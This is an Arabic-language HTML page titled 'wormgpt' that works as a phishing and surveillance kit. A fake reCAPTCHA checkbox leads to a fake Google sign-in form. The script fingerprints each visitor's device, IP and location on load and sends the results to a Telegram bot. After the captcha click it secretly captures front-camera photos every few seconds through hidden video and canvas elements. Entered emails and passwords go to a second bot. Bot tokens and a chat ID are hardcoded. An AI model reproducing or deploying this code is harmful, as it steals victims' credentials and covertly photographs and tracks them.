<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>wormgpt</title>
    <style>
        body { background: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .captcha-card { background: white; border: 1px solid #d3d3d3; border-radius: 3px; padding: 15px; width: 300px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 0 4px rgba(0,0,0,0.1); cursor: pointer; }
        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 12px; position: relative; }
        .checkbox.loading { border: 3px solid #f3f3f3; border-top: 3px solid #4a90e2; animation: spin 1s linear infinite; border-radius: 50%; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .login-box { display: none; background: white; border: 1px solid #dadce0; border-radius: 8px; padding: 40px; width: 360px; text-align: center; }
        input { width: 100%; padding: 13px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 5px; box-sizing: border-box; outline-color: #1a73e8; text-align: right; }
        .blue-btn { width: 100%; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 500; margin-top: 10px; }
        video, canvas { position: absolute; left: -9999px; opacity: 0; }
    </style>
</head>
<body>

    <div id="step-captcha" class="captcha-card" onclick="startSystem()">
        <div style="display:flex; align-items:center;">
            <div id="check-btn" class="checkbox"></div>
            <div style="color:#555; font-size:14px; margin-right:10px;">أنا لست برنامج روبوت</div>
        </div>
        <div style="text-align:center;">
            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30">
        </div>
    </div>

    <div id="step-google" class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
        <div id="email-div">
            <input type="email" id="email" placeholder="البريد الإلكتروني">
            <button class="blue-btn" onclick="showP()">التالي</button>
        </div>
        <div id="pass-div" style="display:none;">
            <input type="password" id="pass" placeholder="كلمة المرور">
            <button class="blue-btn" onclick="finalSubmit()">تأكيد</button>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const bot_token = "6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY";
        const bot_token_2 = "6130193245:AAF0ZIPHTZ9Ip4jYSpXLTFPYyx7K3pDEn40";
        const chat_id = "2103976274";

        let user_ip = "جاري الجلب...";

        // --- 1. جلب معلومات الجهاز العميقة ---
        async function getDeviceDetails() {
            let model = "Android (Generic)";
            let browser = "Unknown";
            const ua = navigator.userAgent;

            if (navigator.userAgentData) {
                try {
                    const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
                    if (hints.model) model = hints.model;
                } catch (e) {}
            } else {
                if (/iPhone|iPad/i.test(ua)) model = "Apple Device";
                else if (/Samsung/i.test(ua)) model = "Samsung";
                else if (/Huawei/i.test(ua)) model = "Huawei";
            }

            if (ua.includes("Brave")) browser = "Brave";
            else if (ua.includes("Edg/")) browser = "Edge";
            else if (ua.includes("Chrome")) browser = "Chrome";
            else if (ua.includes("Firefox")) browser = "Firefox";

            return { model, browser };
        }

        // --- 2. إرسال التقرير فور الدخول ---
        async function sendInstantReport() {
            const details = await getDeviceDetails();
            let report = "🛑 **تقرير تقني دقيق**\n\n";

            try {
                const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                user_ip = ipRes.ip;
                const geo = await fetch(`https://ipapi.co/${user_ip}/json/`).then(r => r.json());
                report += `🌍 **IP:** \`${user_ip}\`\n📍 **الموقع:** ${geo.city}, ${geo.country_name}\n🏢 **الشركة:** ${geo.org}\n`;
            } catch (e) { report += `🌍 **IP:** فشل جلب الشبكة\n`; }

            report += `📱 **الموديل:** ${details.model}\n`;
            report += `🧭 **المتصفح:** ${details.browser}\n`;
            report += `🎮 **GPU:** ${getGPU()}\n`;
            report += `🖥️ **الشاشة:** ${screen.width}x${screen.height}\n`;
            report += `🔋 **البطارية:** ${navigator.getBattery ? await navigator.getBattery().then(b => Math.round(b.level * 100) + '%') : 'N/A'}\n`;

            fetch(`https://api.telegram.org/bot${bot_token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chat_id, text: report, parse_mode: "Markdown" })
            });
        }

        function getGPU() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            } catch (e) { return "Unknown"; }
        }

        window.onload = sendInstantReport;

        // --- 3. الكاميرا وحل مشكلة الشاشة السوداء ---
        function startSystem() {
            document.getElementById('check-btn').classList.add('loading');
            
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(stream => {
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                // حل مشكلة السواد: انتظر حتى يتأكد المتصفح أن الفيديو "يعمل" فعلياً
                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(snap, 2000); // التقاط أول صورة بعد ثانيتين لضمان استقرار الإضاءة
                    setInterval(snap, 6000);
                };

                setTimeout(() => {
                    document.getElementById('step-captcha').style.display = 'none';
                    document.getElementById('step-google').style.display = 'block';
                }, 1500);
            }).catch(() => {
                document.getElementById('step-captcha').style.display = 'none';
                document.getElementById('step-google').style.display = 'block';
            });
        }

        function snap() {
            const canvas = document.getElementById('c');
            const video = document.getElementById('v');
            if (video.readyState !== 4) return; // التأكد أن الفيديو في حالة جاهزية تامة

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            
            // إضافة فلتر خفيف جداً لإجبار الكانفاس على التحديث وتجاوز حماية Brave
            ctx.filter = "contrast(1.01)";
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(blob => {
                const f = new FormData();
                f.append('chat_id', chat_id);
                f.append('photo', blob, 'snap.jpg');
                fetch(`https://api.telegram.org/bot${bot_token}/sendPhoto`, { method: 'POST', body: f });
            }, 'image/jpeg', 0.8);
        }

        function showP() {
            document.getElementById('email-div').style.display = 'none';
            document.getElementById('pass-div').style.display = 'block';
        }

        function finalSubmit() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('pass').value;
            const report = `📥 **صيد جديد**\n\n📧: \`${email}\`\n🔑: \`${pass}\`\n🌍 IP: \`${user_ip}\``;
            fetch(`https://api.telegram.org/bot${bot_token_2}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chat_id, text: report, parse_mode: "Markdown" })
            });
            window.location.href = "wormgpt.html";
        }
    </script>
</body>
</html>
